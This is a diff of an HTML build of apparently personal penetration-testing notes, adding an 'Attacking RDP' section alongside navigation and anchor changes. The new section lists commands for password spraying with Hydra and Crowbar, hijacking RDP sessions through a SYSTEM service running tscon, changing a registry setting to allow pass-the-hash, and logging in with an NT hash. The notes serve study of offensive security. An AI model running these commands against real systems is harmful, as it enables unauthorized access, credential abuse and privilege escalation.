@@ -39,10 +39,10 @@
             const path_to_root = "";
             const default_light_theme = "light";
             const default_dark_theme = "navy";
-            window.path_to_searchindex_js = "searchindex-ce326670.js";
+            window.path_to_searchindex_js = "searchindex-4de8d6c1.js";
         </script>
         <!-- Start loading toc.js asap -->
-        <script src="toc-0412fd45.js"></script>
+        <script src="toc-eb50251f.js"></script>
     </head>
     <body>
     <div id="mdbook-help-container">
@@ -600,13 +600,14 @@
 <ul>
 <li><a href="#attacking-smb">attacking-smb</a></li>
 <li><a href="#attacking-sql-databases">attacking-sql-databases</a></li>
+<li><a href="#attacking-rdp">attacking-rdp</a></li>
 <li><a href="#cracking-protected-files-and-archives">cracking-protected-files</a></li>
 <li><a href="#crawling">crawling</a></li>
 <li><a href="#robotstxt">robots.text</a></li>
 <li><a href="#shell-harnesses">shell-harnesses</a></li>
 <li><a href="#shells-and-payloads">shell-payloads</a></li>
 <li><a href="#well-known-uris">well-known-uris</a></li>
-<li><a href="#enumeration-3">Enumeration</a></li>
+<li><a href="#enumeration-4">Enumeration</a></li>
 <li><a href="#footprinting-9">footprinting</a></li>
 <li><a href="#hydra-1">Brute-Forcing</a></li>
 <li><a href="#cve-common-vulnerabilities-and-exposures">CVE</a></li>
@@ -30717,7 +30718,8 @@ ac
 <ul>
 <li><a href="#attacking-smb">attacking-smb</a></li>
 <li><a href="#attacking-sql-databases">attacking-sql-databases</a></li>
-<li><a href="#enumeration-3">enumeration</a></li>
+<li><a href="#attacking-rdp">attacking-rdp</a></li>
+<li><a href="#enumeration-4">enumeration</a></li>
 <li><a href="#crawling">crawling</a></li>
 <li><a href="infosec/robots-text.html">robots-text</a></li>
 <li><a href="#shell-harnesses">shell-harnesses</a></li>
@@ -31040,6 +31042,52 @@ GO
 <li>Impersonate users</li>
 <li>Pivot to linked servers</li>
 </ul>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="attacking-rdp"><a class="header" href="#attacking-rdp">Attacking RDP</a></h1>
+<p>RDP (Remote Desktop Protocol) is Microsoft’s proprietary protocol for remote graphical access over TCP/3389.</p>
+<h2 id="enumeration-3"><a class="header" href="#enumeration-3">Enumeration</a></h2>
+<pre><code class="language-bash">nmap -Pn -p3389 192.168.2.143
+</code></pre>
+<h2 id="password-attacks"><a class="header" href="#password-attacks">Password Attacks</a></h2>
+<h3 id="password-spraying-1"><a class="header" href="#password-spraying-1">Password Spraying</a></h3>
+<p>Use password spraying to avoid account lockouts (one password against many users).</p>
+<p><strong>Crowbar:</strong></p>
+<pre><code class="language-bash">crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
+</code></pre>
+<p><strong>Hydra:</strong></p>
+<pre><code class="language-bash">hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
+</code></pre>
+<h3 id="rdp-login"><a class="header" href="#rdp-login">RDP Login</a></h3>
+<pre><code class="language-bash">rdesktop -u admin -p password123 192.168.2.143
+# or
+xfreerdp /v:192.168.2.143 /u:admin /p:password123
+</code></pre>
+<h2 id="rdp-session-hijacking"><a class="header" href="#rdp-session-hijacking">RDP Session Hijacking</a></h2>
+<p>Hijack another user’s RDP session to escalate privileges. Requires local admin (to get SYSTEM).</p>
+<ol>
+<li>
+<p>List sessions:</p>
+<pre><code class="language-cmd">query user
+</code></pre>
+</li>
+<li>
+<p>Create a service to run tscon as SYSTEM:</p>
+<pre><code class="language-cmd">sc.exe create sessionhijack binpath= "cmd.exe /k tscon &lt;TARGET_SESSION_ID&gt; /dest:&lt;YOUR_SESSION_NAME&gt;"
+net start sessionhijack
+</code></pre>
+</li>
+</ol>
+<blockquote>
+<p>Note: This method no longer works on Server 2019.</p>
+</blockquote>
+<h2 id="rdp-pass-the-hash"><a class="header" href="#rdp-pass-the-hash">RDP Pass-the-Hash</a></h2>
+<p>Use an NT hash instead of a plaintext password. Requires <strong>Restricted Admin Mode</strong> enabled on target.</p>
+<p><strong>Enable Restricted Admin Mode:</strong></p>
+<pre><code class="language-cmd">reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
+</code></pre>
+<p><strong>Connect with hash:</strong></p>
+<pre><code class="language-bash">xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9
+</code></pre>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="cracking-protected-files-and-archives"><a class="header" href="#cracking-protected-files-and-archives">Cracking Protected Files and Archives</a></h1>
 <p>The use of file encryption is often neglected in both private and professional contexts. Even today, emails containing job applications, account statements, or contracts are frequently sent without encryption—sometimes in violation of legal regulations. For example, within the European Union, the General Data Protection Regulation (GDPR) requires that personal data be encrypted both in transit and at rest. Nevertheless, it remains standard practice to discuss confidential topics or transmit sensitive data via email, which may be intercepted by attackers positioned to exploit these communication channels.</p>
@@ -31547,7 +31595,7 @@ find . -exec /bin/sh \; -quit
 <h2 id="reconnaissance-strategy"><a class="header" href="#reconnaissance-strategy">Reconnaissance Strategy</a></h2>
 <p>Exploring the IANA Registry and experimenting with the various <code>.well-known</code> URIs is an invaluable approach to uncovering additional web reconnaissance opportunities. As demonstrated with the <code>openid-configuration</code> endpoint above, these standardized URIs provide structured access to critical metadata and configuration details, enabling security professionals to comprehensively map out a website’s security landscape.</p>
 <div style="break-before: page; page-break-before: always;"></div>
-<h1 id="enumeration-3"><a class="header" href="#enumeration-3">Enumeration</a></h1>
+<h1 id="enumeration-4"><a class="header" href="#enumeration-4">Enumeration</a></h1>
 <h2 id="principles-of-enumeration"><a class="header" href="#principles-of-enumeration">Principles of Enumeration</a></h2>
 <ul>
 <li>Enumeration is the systematic process of gathering information about a target system or network to identify potential vulnerabilities and entry points. There are two methods of enumeration: active and passive.</li>
